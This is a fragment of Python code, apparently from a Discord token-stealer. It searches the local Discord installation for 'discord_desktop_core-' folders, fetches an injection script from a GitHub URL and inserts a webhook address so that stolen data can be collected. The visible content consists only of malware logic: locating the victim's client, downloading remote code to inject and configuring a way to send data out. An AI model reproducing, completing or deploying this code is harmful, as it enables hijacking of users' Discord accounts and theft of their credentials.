            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    ...
                    try:
                        ...
                        pass
                    f = requests.get("https://raw.githubusercontent.com/addi00000/Discord-Injection/refs/heads/master/Injection-clean.js").text.replace("%WEBHOOK_LINK%", self.webhook)
